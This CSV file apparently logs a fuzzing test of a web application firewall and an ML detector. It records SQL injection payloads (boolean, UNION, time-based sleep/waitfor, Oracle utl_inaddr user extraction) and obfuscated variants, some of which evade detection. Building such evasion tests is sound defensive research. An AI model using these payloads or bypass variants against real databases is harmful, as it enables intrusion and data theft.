Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T17:44:07.050603,1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,403,403,Error,waf_correct_ml_incorrect,"'A~#'='A~#''   ) 
/**/ )    and 6240  =    (  'qqpjq'||  (  select case  AND (SELECT 1) when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc7",2024-12-16T17:44:07.126019,403,Error,waf_correct_ml_incorrect,'A~#' LIkE 'A~#''   )    )    and (SELECT 6240)  =    (  'qqpjq'||  (  select case  AND (SELECT 1) when 3981 LIKE 3981 then (SELECT 1) else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc7,2024-12-16T17:44:08.146120,403,Error,waf_correct_ml_incorrect,"'A~#' like 'A~#''   )    )/**/   and (SELECT 6240)  =    (  'qqpjq'||  (  select case  AND (SELECT (SELECT 1)) when 3981 LIKE 3981 then (SELECT (SELECT 1)) else
'' LIKE '' end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc7M",2024-12-16T17:44:09.175289,403,Error,waf_correct_ml_incorrect,"'A~#' like 'A~#''   )    )/**/   and (SELECT '0S'K'='0S'K')  =    (  'qqpjq'||  (  select case  AND (SELECT (SELECT 1)) when 3981 LIKE (SELECT 0x1) then (SELECT (SELECT 1))/**/else '' LIKE '' end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc7MwR",2024-12-16T17:44:10.204664,403,Error,waf_correct_ml_incorrect,"'A~#' liKe 'A~#''   )    )/*]$m*/   and (SELECT '0S'K' liKE '0S'K')  =    (  'qqpjq'||  (  select case  AND (SELECT (SELECT 'q'<>'qv')) when 0xf8d LIKE (SELECT 0x1) then (SELECT (SELECT  OR 0)) else '' LIKE '' end from rdb$database  )  ||'qzvzq'  )   and    ( 	  (   'rgyc'  =  'rgyc7MwR",2024-12-16T17:44:11.234308,403,Error,waf_correct_ml_incorrect
2,2024-12-16T17:44:12.251234,griffith_chesbro@psykoterapeut.sn,200,200,Error,waf_correct_ml_incorrect,griffith_chesbro@psykoterapeut.sn,2024-12-16T17:44:12.286902,200,Error,waf_correct_ml_incorrect,griffith_chesbro@psykoterapeut.sn,2024-12-16T17:44:13.315275,200,Error,waf_correct_ml_incorrect,griffith_chesbro@psykoterapeut.sn,2024-12-16T17:44:14.341037,200,Error,waf_correct_ml_incorrect,griffith_chesbro@psykoterapeut.sn,2024-12-16T17:44:15.366990,200,200,both_correct,griffith_chesbro@psykoterapeut.sn,2024-12-16T17:44:19.096910,200,200,both_correct
3,2024-12-16T17:44:21.800527,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",403,403,403,both_correct,"-4919/**/ )   union all	seLECt 2608, OR 0,0xa30,2608,'D' LiKe 'D',2608#PP",2024-12-16T17:44:24.768221,403,403,both_correct,"-(SELECT 4919)/**/ )/**/  union all	SElEcT 'L' not like 'Lt', Or  OR 0,0xa30,2608,'D'
liKe 'D',2608#PPab",2024-12-16T17:44:29.330998,403,403,both_correct,"-(SeLEct (SELECT 0x1))/*]]el*/ )/**/  union all	SElECt 'L'/**/not like 'Lt', or	 Or 0,0xa30,2608,'D'
lIKE 'D','z]y' not like 'z]yu'#PPab",2024-12-16T17:44:35.431982,403,200,waf_correct_ml_incorrect,"-(sELeCt (sElEcT 0x1))/**/ )/**/  union all	sELeCt 'L'/**/not like 'Lt', oR/**/ oR  or (SELECT 0)!=9019,0xa30,2608,'D'
LiKe 'D','z]y' not like 'z]yu'#PPab/@",2024-12-16T17:44:43.055279,403,200,waf_correct_ml_incorrect,"-(sElECT (selEcT 0x1))  )/**/  union all	selEcT 'L'/**/not like 'Lt', Or/**/ oR	 oR (sEleCt (SEleCt 0)) NOT LIKE 9019,0xa30,(SELECT 1)!=4482,'D'
LIke 'D','z]y' not like 'z]yu'#PPab/@:@",2024-12-16T17:44:51.464028,403,403,both_correct
4,2024-12-16T17:45:01.181476,c5fra98,200,200,200,both_correct,c5fra98,2024-12-16T17:45:01.642961,200,200,both_correct,c5fra98,2024-12-16T17:45:03.086744,200,200,both_correct,c5fra98,2024-12-16T17:45:04.565321,200,200,both_correct,c5fra98,2024-12-16T17:45:06.016757,200,200,both_correct,c5fra98,2024-12-16T17:45:07.475650,200,200,both_correct
5,2024-12-16T17:45:08.961668," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",403,403,403,both_correct," And '0x1@' NOT LIKE '1@Y'  =
 utl_inaddr.get_host_address   (    (   sElEcT DIStiNCt  (  USERNAME /**/)   fRom   (  SeleCT DisTiNCt  (  USERNAME  )  , ROWNUM aS LIMIT From SYS.ALL_USERS  )   whEre LIMIT  =  (SELECT 1)   )    )    anD 'i'  =  'i",2024-12-16T17:45:19.067535,403,403,both_correct," aNd '0x1@' NOT LIKE '2179 IN ((SELECT (SELECT 1)),2179,2180)@Y'   LIKE 	 utl_inaddr.get_host_address   (    (   seLecT DistiNCT  (  USERNAME  )   fRom   (  sElEct DisTINCt  (  USERNAME  )  , ROWNUM As LIMIT FrOm SYS.ALL_USERS  )   whERE LIMIT  =  (sElEct 1)   )    )    And 'i'  =  'i",2024-12-16T17:45:31.454718,403,403,both_correct," ANd '0x1@' NOT LIKE ' AND 1 IN ((SELECT (SELECT '1' NOT LIKE '1h')),2179,(SELECT 2180))@Y'   LiKE/**/  utl_inaddr.get_host_address   (    (   seLECT DiStiNCt  (  USERNAME  )   FroM   (  SeLEcT DIstInct  (  USERNAME  )  , ROWNUM aS LIMIT FroM SYS.ALL_USERS  )   WHEre LIMIT   lIKE   (selEcT 1)   )    )    aNd 'i'  =  'i",2024-12-16T17:45:46.455110,403,403,both_correct," anD '0x1@' NOT LIKE ' AND 1 IN ((SELECT (SELECT '1' NOT LIKE '1h')),(SELECT 2179),(SELECT 5155 LIKE  OR 0))@Y'   like/**/  utl_inaddr.get_host_address   (   /*J~""l*/(   SElECt DIStiNcT  (  USERNAME  )   FROM   (  selEcT diSTincT  (  USERNAME  )  , ROWNUM As LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT 
 liKE   (selEct 1)   )    )    and 'i'  =  'i",2024-12-16T17:46:02.447814,403,403,both_correct," ANd '0x1@' not like ' AND '} f.'='} f.' IN ((SELECT (SELECT '1' NOT LIKE '1h')),(SELECT 2179),(SELECT 5155 LIKE  OR (SELECT 0)))@Y'   liKE   utl_inaddr.get_host_address   (
  /**/(   SelECt DiStInCT  (  USERNAME  )   FrOm   (  sElEcT dIsTINct  (  USERNAME  )  , ROWNUM AS LIMIT FRom SYS.ALL_USERS  )   whEre LIMIT 
 liKE   (SElECt  OR 0)   )    )    ANd 'i'  =  'i",2024-12-16T17:46:19.786125,200,403,waf_incorrect_ml_correct
6,2024-12-16T17:46:37.974595,"travesia brieva, 171,",200,200,200,both_correct,"travesia/**/brieva,
'V'<>'VL',",2024-12-16T17:46:39.100667,200,200,both_correct,"travesia/* vP*/brieva,
'V' NOT LIKE 'VL',",2024-12-16T17:46:41.602342,200,200,both_correct,"travesia/*/*$(*/vP*/brieva, 'V' not like 'VL',",2024-12-16T17:46:44.642691,403,200,waf_incorrect_ml_correct,"travesia/*/*$(*/vP*/brieva, 'V'/**/not like	'VL',",2024-12-16T17:46:47.970160,403,200,waf_incorrect_ml_correct,"travesia/*/*$(*/vP*/brieva, 'V' not like 'VL',",2024-12-16T17:46:51.463662,403,200,waf_incorrect_ml_correct
7,2024-12-16T17:46:54.922614,1   )    )    as kiqk where 7366  =  7366 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,403,403,403,both_correct," oR 0x0
  )    )    AS kiqk wheRe 7366   like   7366 aND   (  sELECt */**/FroM   (  SeLECt  (  sleep  (  5   )    )     )  gcrr  )  #",2024-12-16T17:47:00.574192,200,200,both_incorrect," or 0x0   )    )    AS kiqk WHERe 7366   liKe   7366 and /**/ (  seLEcT */**/fRom   (  sEleCt  (  sleep  (  (SELECT (SELECT 5870 IN (5869,5870,5871)))   )    )     )  gcrr  )  #n",2024-12-16T17:47:07.795791,200,403,waf_incorrect_ml_correct," or 0x0   )    )    As kiqk WhERE 7366   LIke   7366 AnD  	(  seLEcT */**/from   (  SeLect  (  sleep  (  (sELECT (selEct  or 4172!=4173 iN (5869,5870,0x16ef)))   )    )     )  gcrr  )  #n",2024-12-16T17:47:17.113566,200,200,both_incorrect," Or 0x0   )    )    AS kiqk wHERe 7366   LIke   0x1cc6 ANd  	(  SeLecT */**/froM   (  seLecT  (  sleep  ( 	(sElECt (SELEcT  or 4170 In (4169,4170,4171) not like 4173 in ( ANd 1,5870,0x16ef))) /**/ )    )     )  gcrr  )  #nS",2024-12-16T17:47:26.996288,200,200,both_incorrect," || 0x0   )    )    aS kiqk wheRE 7366   LikE   0x1cc6 anD  	(  select */*[EV*/from   (  sELECt  (  sleep  ( 
(SElecT (sElecT  or (SELECT 1) IN (4169,4170,(SELECT 4171)) not like 4173 iN ( AnD 9394<>9395,5870,0x16ef)))   )    )     )  gcrr  )  #nS",2024-12-16T17:47:38.457001,403,403,both_correct
8,2024-12-16T17:47:51.198802,1'  )   where 1363  =  1363,403,200,200,both_incorrect,"0x1'  )   WheRe 1363
 =  (sEleCt/**/'&'='&')",2024-12-16T17:47:52.577645,403,200,waf_correct_ml_incorrect,"0x1'  )  /**/WheRe (SELECT ')'!=')\')

=  (sEleCt/**/'&'='&')",2024-12-16T17:47:55.682522,200,403,waf_incorrect_ml_correct,"0x1'  )/**/ /**/WheRe (SELECT ')'!=')\')

= 	(sEleCt/**/'&'='&')",2024-12-16T17:47:59.638172,200,403,waf_incorrect_ml_correct,"0x1'  )/**/ /**/WheRe (SELECT/**/')'!=')\')

=  (sEleCt/*iUrN*/'&'='&')",2024-12-16T17:48:03.744323,200,200,both_incorrect,"0x1'  )/*-\4w
*/ /**/WheRe (SELECT/**/')'!=')\') 
=/**/ (sEleCt/**/'&'='&')",2024-12-16T17:48:08.182204,200,200,both_incorrect
9,2024-12-16T17:48:13.011427,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,403,403,403,both_correct,"1  )   Where '@Cv*'='@Cv*'   LIkE  
8320/**/waitfor delay '0:0x0: AND 1'--",2024-12-16T17:48:15.516694,403,403,both_correct," aNd 1  )   WhEre '@Cv*' LIKE '@Cv*'   liKE   0x2080 waitfor delay '0:0x0: AND 3313 IN (3312,3313,3314)'--",2024-12-16T17:48:20.020288,403,403,both_correct," and 'u+O3d' LIKE 'u+O3d'  )   WHere '@Cv*' lIKe	'@Cv*'   liKE   0x2080 waitfor delay ' AND 1:0x0: AND 3313 IN (3312,3313,(SELECT/**/3314))'--",2024-12-16T17:48:26.041038,200,403,waf_incorrect_ml_correct," ANd 'u+O3d' lIkE 'u+O3d'  )   wherE '@Cv*' LIKE '@Cv*'   LIKe   0x2080 waitfor delay ' AND (SELECT 1):0x0: AND 3313 IN (3312,'$Aw'='$Aw',(SELECT  AND 1))'--",2024-12-16T17:48:33.698806,200,403,waf_incorrect_ml_correct," AND 'u+O3d' LIke 'u+O3d'/**/ )   WHERE '@Cv*' lIke	'@Cv*'   LIKE   0x2080 waitfor delay ' AND (SELECT (SELECT (SELECT 1))):0x0: AND '' NOT LIKE 'd' IN (3312,'$Aw'='$Aw',(SELECT  AND 1))'--",2024-12-16T17:48:42.327057,200,403,waf_incorrect_ml_correct
10,2024-12-16T17:48:52.203520,1.50338E+15,200,200,200,both_correct,0x1.50338E+'='!='=B',2024-12-16T17:48:52.817263,200,200,both_correct,0x1.50338E+'='/*@RIo`*/not like '=B',2024-12-16T17:48:54.890489,200,200,both_correct,0x1.50338E+'='/*vSBt	*/not/**/like	'=B',2024-12-16T17:48:57.669699,200,200,both_correct,"0x1.50338E+'='/*vSBt
*/not/**/like	'=B'",2024-12-16T17:49:00.655217,200,200,both_correct,"0x1.50338E+'='/**/not
like	'=B'",2024-12-16T17:49:03.580688,200,200,both_correct
